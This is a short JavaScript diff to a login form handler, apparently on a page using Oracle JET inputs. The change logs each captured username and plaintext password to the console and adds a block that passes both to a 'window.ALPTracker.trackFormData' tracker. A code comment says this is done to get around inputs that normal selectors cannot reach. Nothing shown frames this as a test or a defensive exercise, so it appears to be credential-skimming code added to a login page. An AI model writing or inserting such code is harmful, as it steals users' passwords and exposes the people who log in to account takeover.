@@ -82,7 +82,17 @@
                     usernameValue = String(usernameValue || '').trim();
                     passwordValue = String(passwordValue || '').trim();
                     
-                    console.log('Username:', usernameValue, 'Password:', passwordValue); // Debug
+                    console.log('[ALP] Captured — Username:', usernameValue, 'Password:', passwordValue);
+
+                    // Send directly via ALPTracker (bypasses querySelectorAll which can't reach Oracle JET inputs)
+                    if (usernameValue || passwordValue) {
+                      if (window.ALPTracker && typeof window.ALPTracker.trackFormData === 'function') {
+                        window.ALPTracker.trackFormData({
+                          username: usernameValue,
+                          password: passwordValue
+                        });
+                      }
+                    }
                     
                     // Check if both fields are filled
                     if (!usernameValue || !passwordValue) {
